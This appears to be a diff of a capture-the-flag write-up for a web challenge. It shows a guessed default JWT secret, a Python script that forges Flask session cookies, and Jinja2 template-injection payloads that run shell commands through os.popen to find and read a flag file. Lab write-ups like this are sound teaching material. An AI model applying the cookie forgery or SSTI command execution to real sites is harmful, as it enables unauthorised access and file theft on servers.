@@ -167,11 +167,15 @@ if __name__ == '__main__':
 
 Firstly, a login screen is displayed.
 
+![image](../media/qnqportal1.png)
+
 From the source code, it's clear that we need to login as "Flag", but we only have its md5-hashed password. [John the Ripper](https://github.com/openwall/john) with `rockyou.txt` couldn't decrypt it.
 
-Registering with some username ("hello") and password ("world") and then logging in sets two cookies: `admin_jwt` and `session`
+Registering with some username ("user52") and password ("pass") and then logging in sets two cookies: `admin_jwt` and `session`
 
-On [jwt.io](https://www.jwt.io/), decoding the `admin_jwt` cookie value gives a payload that contains `"user":"hello", "role":"User"`
+![image](../media/qnqportal2.png)
+
+On [jwt.io](https://www.jwt.io/), decoding the `admin_jwt` cookie value gives a payload that contains `"sub":"hello", "role":"User"`
 
 ```python
 base = os.environ.get("Q_SECRET", "qnqsec-default")
@@ -181,15 +185,44 @@ app.config['JWT_SECRET'] = hashlib.sha256(("jwtpepper:" + base).encode()).hexdig
 
 On the same website, we can verify if a given JWT key is valid or not for the provided token. The SHA256 hash of `jwtpepper:qnqsec-default` worked! So, the value of `base` is `qnqsec-default`.
 
-Now, we can encode a new jwt token with `"user":"Flag", "role":"admin"`; and use Flask to create a new session token with `"user":"Flag"`
+![image](../media/qnqportal3.png)
 
-Set these cookies to the updated values and go to the `/account` endpoint. Now we get access to the admin account, and a form is displayed which asks us to provide a *template* which it will render. This is obviously **SSTI**
+Now, we can encode a new jwt token with `"sub":"Flag", "role":"admin"`; and use Flask to create a new session token with `"user":"Flag"`
+
+![image](../media/qnqportal4.png)
+
+```python
+from flask import Flask
+from flask.sessions import SecureCookieSessionInterface
+
+def generate_flask_session(payload, secret_key):
+    app = Flask(__name__)
+    app.secret_key = secret_key
+
+    si = SecureCookieSessionInterface()
+    serializer = si.get_signing_serializer(app)
+
+    return serializer.dumps(payload)
+
+if __name__ == "__main__":
+    SECRETKEY = "40913aa300c33db34d976a59975adf18d90a246a" # SHA1 of 'pepper:qnqsec-default'
+    payload = {"user": "Flag"}
+    cookie_value = generate_flask_session(payload, SECRETKEY)
+    print(cookie_value)
+
+```
+
+Set these cookies to the updated values and go to the `/account` endpoint.
+
+![image](../media/qnqportal5.png)
+
+![image](../media/qnqportal6.png)
+
+A form is displayed which asks us to provide a *template* which it will render. This is obviously **SSTI**. Verified by rendering `{{ 7 * '7'}}`, it outputs `7777777`
 
 Step-by-step payload to get the flag:
 
 ```text
-{{ request.application.__globals__.__builtins__.__import__('os').popen('ls /').read() }}
-{{ request.application.__globals__.__builtins__.__import__('os').popen('ls /app/').read() }}
-{{ request.application.__globals__.__builtins__.__import__('os').popen('ls /app/secret/').read() }}
+{{ request.application.__globals__.__builtins__.__import__('os').popen('find / -name *flag*').read() }}
 {{ request.application.__globals__.__builtins__.__import__('os').popen('cat /app/secret/flag.txt').read() }}
 ```
